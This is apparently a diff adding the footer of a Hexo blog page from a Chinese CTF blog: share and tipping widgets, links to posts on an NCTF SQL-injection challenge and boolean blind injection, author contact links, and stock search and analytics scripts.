+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2021/12/09/2021NCTF-web%20ezsql%E5%A4%8D%E7%8E%B0/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/33c7c2eba898e1a00f50d7a2c469b02.jpg" class="responsive-img" alt="2021NCTF-web ezsql复现">
+                        
+                        <span class="card-title">2021NCTF-web ezsql复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ezsql
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-09
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf-SQL/">
+                        <span class="chip bg-color">ctf-SQL</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/11/26/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/edc7038fd940fd25c72c9f93bea55a5e_3972849105749377233.jpg" class="responsive-img" alt="布尔盲注基础知识">
+                        
+                        <span class="card-title">布尔盲注基础知识</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            布尔盲注基础知识
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf-SQL-ctf-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
+                        <span class="chip bg-color">ctf-SQL ctf-布尔盲注</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">kingkb</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">64.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/kingofkb" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1527411491@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1527411491" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1527411491" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="https://space.bilibili.com/283283733?spm_id_from=333.1007.0.0" class="tooltipped" target="_blank" data-tooltip="关注我的B站" data-position="top" data-delay="50">
+        <i class="fa-brands fa-bilibili"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
